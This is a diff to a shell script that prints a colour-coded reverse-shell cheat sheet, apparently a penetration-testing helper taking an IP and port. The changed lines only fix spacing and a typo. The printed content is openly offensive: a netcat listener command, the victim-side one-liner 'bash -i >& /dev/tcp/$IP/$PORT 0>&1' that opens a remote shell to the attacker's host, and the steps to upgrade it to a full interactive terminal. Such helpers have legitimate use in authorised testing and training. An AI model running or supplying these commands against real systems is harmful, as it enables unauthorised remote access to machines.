@@ -18,13 +18,13 @@ PORT=$2
           echo
           echo
           echo -e "\e[31m============= FULL TTY ============\e[0m"
-          echo -e "\e[31mAttacker. In system shell(prepare listener)\e[0m"
+          echo -e "\e[31mAttacker. In system shell (prepare listener)\e[0m"
           echo -e "\e[92mrlwrap -r -f . nc -lnvp 8080\e[0m"
           echo -e "\e[31mVictim (execute reverse)\e[0m"
           echo -e "\e[92mbash -i >& /dev/tcp/$IP/$PORT 0>&1\e[0m"
           echo -e "\e[31mAttacker. In reverse shell (suspend foreground process)\e[0m"
           echo -e "\e[92mCTRL+Z\e[0m"
-          echo -e "\e[31mAttacker In system shell (disable echo and send job to foregroung. You will be returned to revshell)\e[0m"
+          echo -e "\e[31mAttacker In system shell (disable echo and send job to foreground. You will be returned to revshell)\e[0m"
           echo -e "\e[92mstty raw -echo\e[0m"
           echo -e "\e[92mfg\e[0m"
           echo -e "\e[31mAttacker. In reverse shell\e[0m"
